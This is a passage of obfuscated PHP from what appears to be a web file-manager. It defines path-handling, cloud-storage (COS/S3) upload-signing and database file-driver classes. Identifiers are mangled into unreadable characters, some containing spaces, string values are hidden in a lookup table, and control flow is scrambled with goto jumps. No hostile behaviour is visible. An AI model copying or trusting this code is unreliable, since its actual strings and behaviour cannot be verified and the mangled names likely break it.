3); } while (strstr($Bôƒ ⁄•€Ò, $dáüòØ√î)) { $Bôƒ ⁄•€Ò = str_replace($dáüòØ√î, $bÊ∏µ∑¿èŒ[8], $Bôƒ ⁄•€Ò); } goto bºéùÏã°À; d⁄ú≤¶ó∑Ç: } public static function sourceID($E≥èÃÎâëÊ) { $EÍ¡ƒ±â∞ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DµáﬂπÜóï = self::parse($E≥èÃÎâëÊ); if ($DµáﬂπÜóï[$EÍ¡ƒ±â∞ù[29]] !== self::KOD_SOURCE) { show_json(LNG($EÍ¡ƒ±â∞ù[1078]), !1); } return $DµáﬂπÜóï[$EÍ¡ƒ±â∞ù[367]]; } public static function make($F‹†ó„Û—ß) { if (!$F‹†ó„Û—ß) { return !1; } return self::makePath(self::KOD_SOURCE, intval($F‹†ó„Û—ß)); } public static function makeShare($D¯á¨†¯„á, $F’†ÿØù∫Ó) { return self::makePath(self::KOD_SHARE_ITEM, $D¯á¨†¯„á, $F’†ÿØù∫Ó); } public static function makeFileTypePath($Fè∫öì√°‚) { return self::makePath(self::KOD_USER_FILE_TYPE, $Fè∫öì√°‚); } public static function makeFileTagPath($eé±Êççªπ) { return self::makePath(self::KOD_USER_FILE_TAG, $eé±Êççªπ); } public static function makePath($cŒ≤ìêíñ÷, $FàÚ’òÏâı = '', $E∆πîæìø– = '') { $eπ∂‘≠É«≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÁìÌ‚∫›‘ = substr($cŒ≤ìêíñ÷, 1, -1); $CÍ∆âœâ¶Ñ = $eπ∂‘≠É«≥[1079] . $AÁìÌ‚∫›‘ . $eπ∂‘≠É«≥[1080] . $FàÚ’òÏâı . $eπ∂‘≠É«≥[1081]; $CÍ∆âœâ¶Ñ = $E∆πîæìø– ? $CÍ∆âœâ¶Ñ . $E∆πîæìø– . $eπ∂‘≠É«≥[8] : $CÍ∆âœâ¶Ñ; return $CÍ∆âœâ¶Ñ; } public static function hashPath($D¯ç∂˘Ë◊ü) { $dãØ∆’ÀÖ∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C∞ŒÖÂÀ¯Î = is_array($D¯ç∂˘Ë◊ü) ? $D¯ç∂˘Ë◊ü : IO::info($D¯ç∂˘Ë◊ü); $F°ÖŒèÑõÓ = _get($C∞ŒÖÂÀ¯Î, $dãØ∆’ÀÖ∑[1082], $dãØ∆’ÀÖ∑[33]); if (!$F°ÖŒèÑõÓ) { $dÑëﬂá“âû = KodIO::parse($C∞ŒÖÂÀ¯Î[$dãØ∆’ÀÖ∑[75]]); if (!$dÑëﬂá“âû[$dãØ∆’ÀÖ∑[29]]) { $F°ÖŒèÑõÓ = IO::hashSimple($C∞ŒÖÂÀ¯Î[$dãØ∆’ÀÖ∑[75]]); } } if (!$F°ÖŒèÑõÓ) { $F°ÖŒèÑõÓ = md5($C∞ŒÖÂÀ¯Î[$dãØ∆’ÀÖ∑[75]] . $C∞ŒÖÂÀ¯Î[$dãØ∆’ÀÖ∑[77]] . $C∞ŒÖÂÀ¯Î[$dãØ∆’ÀÖ∑[107]]); } return $F°ÖŒèÑõÓ; } public static function initSystemPath() { $f≠ó ôÔ¿„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (defined($f≠ó ôÔ¿„[1083])) { return; } define($f≠ó ôÔ¿„[1083], self::systemPath($f≠ó ôÔ¿„[1084])); define($f≠ó ôÔ¿„[1085], self::systemPath($f≠ó ôÔ¿„[1086])); define($f≠ó ôÔ¿„[1087], self::systemPath($f≠ó ôÔ¿„[1088])); define($f≠ó ôÔ¿„[1089], self::systemPath($f≠ó ôÔ¿„[1090])); } private static function systemPath($f≠›Œ…ù–√) { goto CÚ⁄‘ ø°ö; CÚ⁄‘ ø°ö: $e‘ÆŸ∆ÀÏ˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DàöÚŒóÀä = $e‘ÆŸ∆ÀÏ˜[1091] . ucfirst($f≠›Œ…ù–√); $FÉ§ÑÛŸ∏” = Model($e‘ÆŸ∆ÀÏ˜[1092])->get($DàöÚŒóÀä); goto c‡√≈ÿ®⁄è; Dﬂ¡§ÏµåÜ: return $FÉ§ÑÛŸ∏”; goto dÛπØè¥ï√; c‡√≈ÿ®⁄è: if ($FÉ§ÑÛŸ∏”) { return $FÉ§ÑÛŸ∏”; } if ($f≠›Œ…ù–√ == $e‘ÆŸ∆ÀÏ˜[1084]) { $FÉ§ÑÛŸ∏” = self::make(Model($e‘ÆŸ∆ÀÏ˜[761])->systemRootPathAdd($e‘ÆŸ∆ÀÏ˜[1093])); } else { $FÉ§ÑÛŸ∏” = self::systemPath($e‘ÆŸ∆ÀÏ˜[1084]); $e„éπäáÓ∞ = self::sourceID($FÉ§ÑÛŸ∏”); $FÉ§ÑÛŸ∏” = self::make(Model($e‘ÆŸ∆ÀÏ˜[761])->mkdir($e„éπäáÓ∞, $f≠›Œ…ù–√)); } Model($e‘ÆŸ∆ÀÏ˜[1092])->set($DàöÚŒóÀä, $FÉ§ÑÛŸ∏”); goto Dﬂ¡§ÏµåÜ; dÛπØè¥ï√: } public static function systemFolder($Aÿ≈ÍØÑÃ‰) { $fﬁØáÒ‰·í = IO_PATH_SYSTEM_SOURCE . $Aÿ≈ÍØÑÃ‰; $d⁄òŒ™Íò¢ = Cache::get($fﬁØáÒ‰·í); if (!$d⁄òŒ™Íò¢) { $d∫Á†é≈àÔ = IO::infoFull($fﬁØáÒ‰·í); if (!$d∫Á†é≈àÔ) { $d⁄òŒ™Íò¢ = IO::mkdir($fﬁØáÒ‰·í, REPEAT_SKIP); } else { $d⁄òŒ™Íò¢ = $d∫Á†é≈àÔ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]; } Cache::set($fﬁØáÒ‰·í, $d⁄òŒ™Íò¢, 3600 * 10); } return $d⁄òŒ™Íò¢; } public static function defaultDriver() { return Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][704])->defaultDriver(); } public static function defaultIO() { $f›ÜÎΩùîõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B⁄ÿ–§ÒÌ‡ = self::defaultDriver(); return $f›ÜÎΩùîõ[1094] . $B⁄ÿ–§ÒÌ‡[$f›ÜÎΩùîõ[367]] . $f›ÜÎΩùîõ[1081]; } public static function defaultDriverInit() { static $C™‰ëÍÆà¨ = false; if ($C™‰ëÍÆà¨) { return $C™‰ëÍÆà¨; } $C™‰ëÍÆà¨ = IO::init(self::defaultIO()); return $C™‰ëÍÆà¨; } public static function fileTypeList() { $aúãáﬂ…‚Ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F÷Û◊≠ø∏ñ = $GLOBALS[$aúãáﬂ…‚Ù[6]][$aúãáﬂ…‚Ù[1095]]; foreach ($F÷Û◊≠ø∏ñ as $EÁú∑Ûå¬î => $CÓ«ﬂ‹œûı) { $dêôú≤Ãìó = $aúãáﬂ…‚Ù[1096] . $EÁú∑Ûå¬î; $d†Âáﬁå…Î = LNG($dêôú≤Ãìó); if ($dêôú≤Ãìó != $d†Âáﬁå…Î) { $F÷Û◊≠ø∏ñ[$EÁú∑Ûå¬î][$aúãáﬂ…‚Ù[28]] = $d†Âáﬁå…Î; } } return $F÷Û◊≠ø∏ñ; } public static function transferType($A®Öì¬äƒí, $B˘Œëé∑Ú∏) { goto A·®éÊîàÔ; A·®éÊîàÔ: $cƒº§ŸÌ™ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bŸÁÙ†„∂¿ = self::driverType($A®Öì¬äƒí); $F–©õ´à◊ã = self::driverType($B˘Œëé∑Ú∏); goto f≤∑›⁄…æÖ; c»òï¿«±Ç: return $cƒº§ŸÌ™ä[1099]; goto d•ìßÍí„; f≤∑›⁄…æÖ: if ($bŸÁÙ†„∂¿[$cƒº§ŸÌ™ä[29]] == $F–©õ´à◊ã[$cƒº§ŸÌ™ä[29]] && $bŸÁÙ†„∂¿[$cƒº§ŸÌ™ä[1097]] == $F–©õ´à◊ã[$cƒº§ŸÌ™ä[1097]]) { return $cƒº§ŸÌ™ä[1098]; } if ($bŸÁÙ†„∂¿[$cƒº§ŸÌ™ä[29]] == $cƒº§ŸÌ™ä[788] && $F–©õ´à◊ã[$cƒº§ŸÌ™ä[29]] == $cƒº§ŸÌ™ä[102]) { return $cƒº§ŸÌ™ä[1044]; } if ($bŸÁÙ†„∂¿[$cƒº§ŸÌ™ä[29]] == $cƒº§ŸÌ™ä[102] && $F–©õ´à◊ã[$cƒº§ŸÌ™ä[29]] == $cƒº§ŸÌ™ä[788]) { return $cƒº§ŸÌ™ä[103]; } goto c»òï¿«±Ç; d•ìßÍí„: } public static function driverType($e€–›£Øö√) { goto AÓµÒÁ«çƒ; AÓµÒÁ«çƒ: $Aï¥õöÖ√Æ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b«Ûßıı˘â = $e€–›£Øö√->path; $DËó±ßò¡  = str_replace($Aï¥õöÖ√Æ[1100], $Aï¥õöÖ√Æ[33], strtolower($e€–›£Øö√->getType())); goto b∑’⁄≤ä€Ã; b∑’⁄≤ä€Ã: if ($DËó±ßò¡  == $Aï¥õöÖ√Æ[694] || $DËó±ßò¡  == $Aï¥õöÖ√Æ[1101] || $DËó±ßò¡  == $Aï¥õöÖ√Æ[1102]) { $e€–›£Øö√ = self::defaultDriverInit(); } else { if ($DËó±ßò¡  == $Aï¥õöÖ√Æ[1052] || $DËó±ßò¡  == $Aï¥õöÖ√Æ[1103]) { $e€–›£Øö√ = IO::init($e€–›£Øö√->pathParse[$Aï¥õöÖ√Æ[1002]]); } } $DËó±ßò¡  = str_replace($Aï¥õöÖ√Æ[1100], $Aï¥õöÖ√Æ[33], strtolower($e€–›£Øö√->getType())); if ($DËó±ßò¡  == $Aï¥õöÖ√Æ[102]) { return array($Aï¥õöÖ√Æ[29] => $Aï¥õöÖ√Æ[102], $Aï¥õöÖ√Æ[1097] => $Aï¥õöÖ√Æ[33], $Aï¥õöÖ√Æ[75] => $b«Ûßıı˘â); } goto C∑ííïü⁄ï; C∑ííïü⁄ï: return array($Aï¥õöÖ√Æ[29] => $Aï¥õöÖ√Æ[788], $Aï¥õöÖ√Æ[1097] => $e€–›£Øö√->pathDriver, $Aï¥õöÖ√Æ[75] => $b«Ûßıı˘â); goto D˘çÕ˘ç÷ã; D˘çÕ˘ç÷ã: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($fÙ¶ƒñﬂáÜ) { parent::__construct($fÙ¶ƒñﬂáÜ); $this->signatureVersion($_SERVER[Ä¿¡‡öóµŸﬂ‡][200]); } public function uploadFormData($b¯˜¯¢º•¥, $B‡˜Á›¨ãô = 3600) { goto CÇÆÛ≈ˆï∞; e∞™ŸÚâÛ¡: $dâ≠ÎÓ≤Î· = sha1($aØáπÖøÛÿ); $a∆º–≠ã»ó = hash_hmac($Eé◊§ó†È’[218], $dâ≠ÎÓ≤Î·, $fÍ–£ÎˆÛ™); $CòÔ¿≥øº¶ = array($Eé◊§ó†È’[1108] => $B◊ì∞íŒÀ€, $Eé◊§ó†È’[1112] => $f‚óÈñˆ†í, $Eé◊§ó†È’[1116] => base64_encode($aØáπÖøÛÿ), $Eé◊§ó†È’[1113] => $AöÉÏ∫ﬂ€á, $Eé◊§ó†È’[1114] => $this->accessKey, $Eé◊§ó†È’[1117] => $c≈∑ù†¶Öß, $Eé◊§ó†È’[1118] => $a∆º–≠ã»ó, $Eé◊§ó†È’[169] => $this->getHost()); goto dı¯Ù¬µáÚ; DâËíù‡á: $aØáπÖøÛÿ = array($Eé◊§ó†È’[1106] => $Aê•∆‰êã, $Eé◊§ó†È’[1107] => array(array($Eé◊§ó†È’[1108] => $B◊ì∞íŒÀ€), array($Eé◊§ó†È’[1109] => $this->bucket), array($Eé◊§ó†È’[1110], $Eé◊§ó†È’[1111], $Eé◊§ó†È’[33]), array($Eé◊§ó†È’[1112] => $f‚óÈñˆ†í), array($Eé◊§ó†È’[1113] => $AöÉÏ∫ﬂ€á), array($Eé◊§ó†È’[1114] => $this->accessKey), array($Eé◊§ó†È’[1115] => $c≈∑ù†¶Öß))); $aØáπÖøÛÿ = json_encode($aØáπÖøÛÿ); $fÍ–£ÎˆÛ™ = hash_hmac($Eé◊§ó†È’[218], $c≈∑ù†¶Öß, $this->secret); goto e∞™ŸÚâÛ¡; CÇÆÛ≈ˆï∞: $Eé◊§ó†È’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B◊ì∞íŒÀ€ = $Eé◊§ó†È’[185]; $AöÉÏ∫ﬂ€á = $Eé◊§ó†È’[218]; goto F‡á—óüÌë; F‡á—óüÌë: $f‚óÈñˆ†í = $Eé◊§ó†È’[1104]; $Aê•∆‰êã = gmdate($Eé◊§ó†È’[1105], time() + $B‡˜Á›¨ãô); $c≈∑ù†¶Öß = (string) time() . $Eé◊§ó†È’[67] . (string) (time() + $B‡˜Á›¨ãô); goto DâËíù‡á; dı¯Ù¬µáÚ: return $CòÔ¿≥øº¶; goto dÑ‚¡¿áΩÿ; dÑ‚¡¿áΩÿ: } public function fileOutLink($C⁄÷ƒä‰∫Ü) { $f≤õßﬁáø€ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (substr($C⁄÷ƒä‰∫Ü, 0, 7) == $f≤õßﬁáø€[1119]) { $C⁄÷ƒä‰∫Ü = $f≤õßﬁáø€[1120] . substr($C⁄÷ƒä‰∫Ü, 7); } header($f≤õßﬁáø€[156] . $C⁄÷ƒä‰∫Ü); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($c©–¬‹ÑÔÔ) { $this->pathParse = $c©–¬‹ÑÔÔ; $this->model = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][1121]); } public function getPath($e™¥ÜÖí‡û) { return trim($e™¥ÜÖí‡û, $_SERVER[Ä¿¡‡öóµŸﬂ‡][8]); } public function pathFather($bô•√€ÑÛ€) { $fº∞Ö–òŸÖ = $this->parse($bô•√€ÑÛ€); $fº∞Ö–òŸÖ = $this->infoSimple($bô•√€ÑÛ€); return $fº∞Ö–òŸÖ ? $fº∞Ö–òŸÖ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][461]] : !1; } public function getPathName($dÚ¶’ŒÏ†») { $EŸ§¿™òéï = $this->infoSimple($dÚ¶’ŒÏ†»); return $EŸ§¿™òéï ? $EŸ§¿™òéï[$_SERVER[Ä¿¡‡öóµŸﬂ‡][28]] : !1; } public function getPathOuter($B§Éà—¶¿¶) { if (!$B§Éà—¶¿¶) { return $B§Éà—¶¿¶; } $aÂﬂéæΩëä = $this->parse($B§Éà—¶¿¶); return KodIO::make($aÂﬂéæΩëä[$_SERVER[Ä¿¡‡öóµŸﬂ‡][367]]); } public function copyFolderFromIO($dˆÆ‡πÒ÷∑, $bêå◊ÂÀà¯, $F∏©Âúﬂ¯£, $CÇÎÕ¬úπã, $E˜»∑ü•Óó) { $Fß«‹å⁄®≤ = $this->model->copyFolderFromIO($dˆÆ‡πÒ÷∑, $bêå◊ÂÀà¯, $F∏©Âúﬂ¯£, $CÇÎÕ¬úπã, $E˜»∑ü•Óó); return KodIO::make($Fß«‹å⁄®≤); } public function isParentOf($EÉîﬂ◊ü—Ç, $dâ©ÆÃπ°å) { return $this->model->isParentOf($EÉîﬂ◊ü—Ç, $dâ©ÆÃπ°å); } public function mkfile($fÿªÔ√¢Ê‘, $cÜä–ÂßËó = '', $CªŒ®ﬁñ„Í = REPEAT_RENAME) { $d◊¯ó–®Ê‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÏ¯íÑ£¥˜ = $this->parse($fÿªÔ√¢Ê‘); $fÿªÔ√¢Ê‘ = $EÏ¯íÑ£¥˜[$d◊¯ó–®Ê‘[367]]; for ($F…ÂïÓÖ£ˆ = 0; $F…ÂïÓÖ£ˆ < count($EÏ¯íÑ£¥˜[$d◊¯ó–®Ê‘[1122]]); $F…ÂïÓÖ£ˆ++) { $eË≥˜ºÕ¯ó = $EÏ¯íÑ£¥˜[$d◊¯ó–®Ê‘[1122]][$F…ÂïÓÖ£ˆ]; if ($F…ÂïÓÖ£ˆ == count($EÏ¯íÑ£¥˜[$d◊¯ó–®Ê‘[1122]]) - 1) { $fÿªÔ√¢Ê‘ = $this->model->mkfile($fÿªÔ√¢Ê‘, $eË≥˜ºÕ¯ó, $cÜä–ÂßËó, $CªŒ®ﬁñ„Í); break; } $fÿªÔ√¢Ê‘ = $this->model->mkdir($fÿªÔ√¢Ê‘, $eË≥˜ºÕ¯ó, REPEAT_SKIP); } return $this->getPathOuter($fÿªÔ√¢Ê‘); } public function mkdir($EÍ˘Î‘ä≈î, $Aá¿õÜ≥Ø® = REPEAT_SKIP) { $Cºí≥®í√ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fœøœàè¢è = $this->parse($EÍ˘Î‘ä≈î); $EÍ˘Î‘ä≈î = $fœøœàè¢è[$Cºí≥®í√ï[367]]; for ($B•¿ëŒ®±≤ = 0; $B•¿ëŒ®±≤ < count($fœøœàè¢è[$Cºí≥®í√ï[1122]]); $B•¿ëŒ®±≤++) { $bÆ‘ÒøÉŒé = $fœøœàè¢è[$Cºí≥®í√ï[1122]][$B•¿ëŒ®±≤]; $EÍ˘Î‘ä≈î = $this->model->mkdir($EÍ˘Î‘ä≈î, $bÆ‘ÒøÉŒé, $Aá¿õÜ≥Ø®); } return $this->getPathOuter($EÍ˘Î‘ä≈î); } public function copyFile($DâÍá≠ò™¶, $a˘∫ßÿàÀÎ, $däÃ®Ç±∏Á = REPEAT_REPLACE) { $DΩ∞ã≤®çõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÓŒêí˜ Í = $this->parse($a˘∫ßÿàÀÎ); $BÑ±‘ùõë⁄ = $this->model->copy($DâÍá≠ò™¶, $EÓŒêí˜ Í[$DΩ∞ã≤®çõ[367]], $däÃ®Ç±∏Á, $EÓŒêí˜ Í[$DΩ∞ã≤®çõ[75]]); return $BÑ±‘ùõë⁄ ? $this->getPathOuter($BÑ±‘ùõë⁄) : !1; } public function moveFile($c˜ŸÖﬂÜ≈‰, $e‚ƒﬁæÚøï, $f√ßÌ˘ãﬁ = REPEAT_REPLACE) { $dŒîÑ®‰äê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÃ¡É¿ÈÂÁ = $this->parse($e‚ƒﬁæÚøï); $F∑ïô·¬≈ê = $this->model->move($c˜ŸÖﬂÜ≈‰, $bÃ¡É¿ÈÂÁ[$dŒîÑ®‰äê[367]], $f√ßÌ˘ãﬁ, $bÃ¡É¿ÈÂÁ[$dŒîÑ®‰äê[75]]); return $F∑ïô·¬≈ê ? $this->getPathOuter($F∑ïô·¬≈ê) : !1; } public function copy($cìãò£…∞ﬁ, $eπ›àßÕ™®, $dˆ¢áå≤· = REPEAT_REPLACE) { $CÎÆ≥¥∑µ„ = $this->parse($eπ›àßÕ™®); $d∞‘œËÙ › = $this->model->copy($cìãò£…∞ﬁ, $CÎÆ≥¥∑µ„[$_SERVER[Ä¿¡‡öóµŸﬂ‡][367]], $dˆ¢áå≤·); return $d∞‘œËÙ › ? $this->getPathOuter($d∞‘œËÙ ›) : !1; } public function moveSameAllow() { } public function move($eç¶äãñ±á, $F Ù√◊ô·¢, $D±Õ‚Ò§¨Ó = REPEAT_REPLACE) { $cÚØ◊àÂ≈À = $this->parse($F Ù√◊ô·¢); $fÇë¯åÒ¶≈ = $this->model->move($eç¶äãñ±á, $cÚØ◊àÂ≈À[$_SERVER[Ä¿¡‡öóµŸﬂ‡][367]], $D±Õ‚Ò§¨Ó); return $fÇë¯åÒ¶≈ ? $this->getPathOuter($fÇë¯åÒ¶≈) : !1; } public function remove($c‡–Ëƒ¨–ï, $Bé÷“Ω’õÆ = true) { return $this->model->remove($c‡–Ëƒ¨–ï, $Bé÷“Ω’õÆ); } public function rename($C§Êâ–†É∫, $e£¬›˘àá‚) { $fãç‰Çåòã = $this->model->rename($C§Êâ–†É∫, $e£¬›˘àá‚); return $fãç‰Çåòã ? $this->getPathOuter($C§Êâ–†É∫) : $fãç‰Çåòã; } public function size($Dî∆ÃüúÇı) { $e˜äƒ√≥äÿ = $this->infoSimple($Dî∆ÃüúÇı); return $e˜äƒ√≥äÿ ? $e˜äƒ√≥äÿ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function infoSimple($EÑª—•ä‹¬) { return $this->model->sourceInfo($EÑª—•ä‹¬); } public function info($FÚ®—˘Ñ¬„) { return $this->infoParse($FÚ®—˘Ñ¬„); } public function infoAuth($FÇ±Ü™ÈÑÒ) { return $this->infoParse($FÇ±Ü™ÈÑÒ, !1, !0); } public function infoWithChildren($e˘ü¨¡÷éõ) { return $this->infoParse($e˘ü¨¡÷éõ, !0); } protected function infoParse($aùßÁ˘’Á√, $b°Íπû±èê = false, $cÊœÂÕúıÒ = false) { if (!$b°Íπû±èê) { return $this->model->pathInfo($aùßÁ˘’Á√, $cÊœÂÕúıÒ); } return $this->model->pathInfoMore($aùßÁ˘’Á√); } public function infoFull($EåºåÈ‰ﬂ—) { $Dó«∫áºôû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d∆Ÿ∂ô÷òΩ = explode($Dó«∫áºôû[8], $EåºåÈ‰ﬂ—); $Fˆ¶™∆‹∂º = implode($Dó«∫áºôû[8], array_splice($d∆Ÿ∂ô÷òΩ, 1)); return $this->model->pathInfoByPath($d∆Ÿ∂ô÷òΩ[0], $Fˆ¶™∆‹∂º); } public function hashSimple($EóÁâı©ëÉ) { $däà⁄π…Ã– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D÷ﬁ®¨ÜÉá = $this->infoWithChildren($EóÁâı©ëÉ); return $D÷ﬁ®¨ÜÉá[$däà⁄π…Ã–[162]][$däà⁄π…Ã–[164]]; } public function hashMd5($eí≠≥ªÆ§„) { $eŸﬁÖ…ûãõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÎ–ÑÕÛÖ§ = $this->infoWithChildren($eí≠≥ªÆ§„); return $eÎ–ÑÕÛÖ§[$eŸﬁÖ…ûãõ[162]][$eŸﬁÖ…ûãõ[163]]; } public function exist($dŸ§“è‹ΩÇ) { $eåÏÇÖÛêá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C≈ûÎÀÃÔ∂ = $this->parse($dŸ§“è‹ΩÇ); if (!$C≈ûÎÀÃÔ∂[$eåÏÇÖÛêá[75]]) { return $this->isFile($dŸ§“è‹ΩÇ) || $this->isFolder($dŸ§“è‹ΩÇ); } $AéŸ…òØóß = array($eåÏÇÖÛêá[368] => $C≈ûÎÀÃÔ∂[$eåÏÇÖÛêá[367]], $eåÏÇÖÛêá[28] => $C≈ûÎÀÃÔ∂[$eåÏÇÖÛêá[75]]); $D∆ÈÔ£•ÚÒ = $this->model->where($AéŸ…òØóß)->find(); return $D∆ÈÔ£•ÚÒ ? !0 : !1; } public function isFile($F¨¥™πœú») { $BéÑˆç‰∏£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÀÒøç´Íã = $this->infoSimple($F¨¥™πœú»); return $eÀÒøç´Íã && $eÀÒøç´Íã[$BéÑˆç‰∏£[370]] == $BéÑˆç‰∏£[83] ? !1 : !0; } public function isFolder($F≈—¨Î∫ë•) { $dûï≠å·çâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aîﬂˆ≤¶¢ = $this->infoSimple($F≈—¨Î∫ë•); return $Aîﬂˆ≤¶¢ && $Aîﬂˆ≤¶¢[$dûï≠å·çâ[370]] == $dûï≠å·çâ[83] ? !0 : !1; } public function listPath($cÍÛŸâÉœø, $E™˘•äìË© = false) { $D…é≠ùıÚÎ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($cÍÛŸâÉœø == $D…é≠ùıÚÎ[33]) { return !1; } $DéäµäÔ¿÷ = array($D…é≠ùıÚÎ[368] => $cÍÛŸâÉœø); if ($E™˘•äìË©) { return $this->model->listSource($DéäµäÔ¿÷, -1); } return $this->model->listSource($DéäµäÔ¿÷); } public function has($dò§œ™Òÿ, $AâûÌ ±ü‚ = false, $eì˜Ñ’—ú¶ = null) { $e“åô€ÖíÊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $føèèµúïø = $this->infoWithChildren($dò§œ™Òÿ); if ($AâûÌ ±ü‚) { return array($e“åô€ÖíÊ[192] => $føèèµúïø[$e“åô€ÖíÊ[192]], $e“åô€ÖíÊ[191] => $føèèµúïø[$e“åô€ÖíÊ[191]]); } return $eì˜Ñ’—ú¶ ? $føèèµúïø[$e“åô€ÖíÊ[192]] : $føèèµúïø[$e“åô€ÖíÊ[191]]; } public function listAll($c‹Èß¬ŸâÊ) { $Bï”¶”≠«÷ = IO::info($this->pathParse[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]); if (!$Bï”¶”≠«÷) { return array(); } return $this->model->listAll($c‹Èß¬ŸâÊ); } public function getContent($aﬂñ˘¯âÙÎ) { return $this->model->getContent($aﬂñ˘¯âÙÎ); } public function setContent($a∏ÇÆÕ„ÛΩ, $d∏áÖÚ°∆Ω = '') { return $this->model->setContent($a∏ÇÆÕ„ÛΩ, $d∏áÖÚ°∆Ω); } public function fileSubstr($c¶†èØäà‚, $CƒØ†Ï ê‹, $f··ã∫œ≤–) { return $this->model->fileSubstr($c¶†èØäà‚, $CƒØ†Ï ê‹, $f··ã∫œ≤–); } public function download($eà›–Àüü∏, $f⁄ﬁô™¢Ü— = '') { $eùíÔçñßé = get_path_father($f⁄ﬁô™¢Ü—); $eõ„Ú÷ÿ‘◊ = get_path_this($f⁄ﬁô™¢Ü—); $Aî©ñÉÀéñ = $this->model->fileInfoGet($eà›–Àüü∏); $dû¯–ö›øô = IO::copy($Aî©ñÉÀéñ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]], $eùíÔçñßé, !1, $eõ„Ú÷ÿ‘◊); return $dû¯–ö›øô; } public function upload($CÉ¿©ÁŸÉã, $A∑·Õ∆§£è, $BÉ≈ﬁŒπµú = false, $B—ÛªãñÜô = REPEAT_REPLACE) { $Bñ€ÀŸ‚±∞ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¶ΩÚÖä§≥ = $this->parse($CÉ¿©ÁŸÉã); $f∏‰æÑç®√ = $this->model->addFile($B¶ΩÚÖä§≥[$Bñ€ÀŸ‚±∞[367]], $A∑·Õ∆§£è, $B¶ΩÚÖä§≥[$Bñ€ÀŸ‚±∞[75]], $BÉ≈ﬁŒπµú, $B—ÛªãñÜô); return $this->getPathOuter($f∏‰æÑç®√); } public function uploadFileByID($d¶…¡Ÿñ’¬, $EÕóËÒú√è, $cµøé ö¯™) { $fÖã§ãùïÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a‘ﬂ‚ñÓ›‡ = $this->parse($d¶…¡Ÿñ’¬); $e≠”è¶ä©† = $this->model->addFileByFileID($a‘ﬂ‚ñÓ›‡[$fÖã§ãùïÜ[367]], $EÕóËÒú√è, $a‘ﬂ‚ñÓ›‡[$fÖã§ãùïÜ[75]], $cµøé ö¯™); return $this->getPathOuter($e≠”è¶ä©†); } public function addFileByRemote($C¶–Û»ÃÌª, $Eà“±¯¯•—, $D°çˆÚ„™¢ = array(), $C…ëàÌÊ‰ˆ = '', $b√ß«¯π§») { $a≤Ùå¢Ç†è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cüÕˆì€ËŸ = $this->parse($C¶–Û»ÃÌª); $C…ëàÌÊ‰ˆ = empty($C…ëàÌÊ‰ˆ) ? $cüÕˆì€ËŸ[$a≤Ùå¢Ç†è[75]] : $C…ëàÌÊ‰ˆ; $fﬁ™‘’ø¯⁄ = $this->model->addFileByRemote($cüÕˆì€ËŸ[$a≤Ùå¢Ç†è[367]], $Eà“±¯¯•—, $C…ëàÌÊ‰ˆ, $D°çˆÚ„™¢, $b√ß«¯π§»); return $this->getPathOuter($fﬁ™‘’ø¯⁄); } public function uploadLink($A⁄®ª£≤à∏, $Aòíé„Ωù‚ = 0) { $A´∏òû„Ã‡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B∂‚ü…øÂ® = $this->parse($A⁄®ª£≤à∏); $A⁄®ª£≤à∏ = Model($A´∏òû„Ã‡[544])->createFileName($B∂‚ü…øÂ®[$A´∏òû„Ã‡[75]]); $cÃ≤é¨ÙÉΩ = IO::uploadLink($A⁄®ª£≤à∏, $Aòíé„Ωù‚); return $cÃ≤é¨ÙÉΩ; } public function fileNameAuto($dŸ‹ﬁÑ¶§•, $CøòÇ∏ﬁ˜à, $FÚÊ”™á§Ü = REPEAT_REPLACE, $cêÚÔã°◊ = false) { return $this->model->fileNameAuto($dŸ‹ﬁÑ¶§•, $CøòÇ∏ﬁ˜à, $FÚÊ”™á§Ü, $cêÚÔã°◊); } public function fileNameExist($aÙî¯€±ˆè, $EìàÕ¯≠¶ë) { return $this->model->fileNameExist($aÙî¯€±ˆè, $EìàÕ¯≠¶ë); } protected function _fileOut($Eº„£á‘ùã, $bí…Ù‰…óü = false, $däıÑ∫Î¥™ = false, $b‡Æ«êÜ≠— = '', $BÇŸ√”õ£ = false) { goto B“ú…öÈ°; eùß¡òÜπ: $E‡ˆº∞ô…∂ = $this->model->fileInfoGet($Eº„£á‘ùã); $b‡Æ«êÜ≠— = $E‡ˆº∞ô…∂[$a…ë•¡úë„[163]] ? $E‡ˆº∞ô…∂[$a…ë•¡úë„[163]] : $b‡Æ«êÜ≠—; $e·µ∂ù‰¿É = isset($GLOBALS[$a…ë•¡úë„[1124]]) ? 